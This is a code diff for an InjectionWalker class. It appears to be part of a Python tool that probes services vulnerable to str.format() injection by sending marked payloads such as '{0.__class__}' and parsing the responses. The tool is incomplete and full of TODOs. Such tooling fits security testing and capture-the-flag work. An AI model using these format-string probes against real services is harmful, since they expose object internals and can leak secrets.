@@ -1,5 +1,7 @@
 """Implementation of the InjectionWalker class."""
 
+import re
+
 from typing import (
     Optional,
     Iterator)
@@ -8,14 +10,14 @@ from .defaults import (
     DEFAULT_INJECTION_RESPONSE_MARKER_LEN)
 from .harnesses import (
     AbstractInjectionHarness)
-from .injection_result import (
-    InjectionResult)
+from .results import (
+    AbstractInjectionResult)
 from .utils import (
     get_random_alnum)
 
 
 class InjectionWalker:
-    """Walk the vulnerable service via format() injections."""
+    """Enumerate a vulnerable service via format() injections."""
 
     def __init__(
         self,
@@ -34,29 +36,41 @@ class InjectionWalker:
         else:
             self._response_marker = get_random_alnum(rand_response_marker_len)
 
+        self._response_re = re.compile(
+            f'{self._response_marker}'
+            '(?P<injection_response>.*)'
+            f'{self._response_marker}', re.DOTALL)
+
     def walk(
-        self
-    ) -> Iterator[InjectionResult]:
+        self,
+        injectable_index: int
+    ) -> Iterator[AbstractInjectionResult]:
         """Yield results from sending injections via :data:`harness`.
 
         Note that the state of the called instance is mutating throughout the
         runtime of this function.
 
         """
-        # TODO: fuzz to get to a starting point
-        # TODO: actually walk the target service
+        # yes, the below line is itself technically injectable
+        format_str = '{' + str(injectable_index) + '.__class__}'
+        payload = self._mark_payload(format_str)
 
-        # TODO: what information are we trying to extract from the target?
-        #       - A complete understanding of objects in memory; i.e.,
-        #         extracting all of their __dict__ members
-        #       - All source code that is reachable / reversible
-        #       - Highlight any anomalous __getitem__ / __getattr__ /
-        #         __getattribute__ methods?
+        raw_app_response = self._harness.send_injection(payload)
+        raw_payload_response = self._parse_response(raw_app_response)
 
-        payload = self._mark_payload('{0.__class__}')
-        raw_response = self._harness.send_injection(payload)
+        if not raw_payload_response:
+            raise ValueError(
+                'Unable to trigger initial injection at index '
+                f'{injectable_index}')
 
-        yield InjectionResult(payload, raw_response)
+        result = AbstractInjectionResult.instance_from_raw_result(
+            format_str, raw_payload_response)
+        if result is None:
+            raise ValueError(
+                f'Unable to parse injection response: {raw_payload_response}')
+
+        print(result)
+        # TODO: iterate over result's walk()
 
     @property
     def harness(
@@ -78,3 +92,34 @@ class InjectionWalker:
     ) -> str:
         """Surround a payload with :data:`response_markers`s."""
         return f'{self._response_marker}{payload}{self._response_marker}'
+
+    def _parse_response(
+        self,
+        raw_app_response: str
+    ) -> Optional[str]:
+        """Parse the actual injection response from a raw response.
+
+        Args:
+            raw_app_response: The raw textual response returned by the
+                vulnerable application
+
+        """
+        result = self._response_re.match(raw_app_response)
+        if not result:
+            return None
+
+        injection_response: str = result.group('injection_response')
+        if not injection_response:
+            return None
+
+        return injection_response
+
+    def __str__(
+        self
+    ) -> str:
+        return 'TODO'
+
+    def __repr__(
+        self
+    ) -> str:
+        return f'<{self.__class__.__qualname__}>'
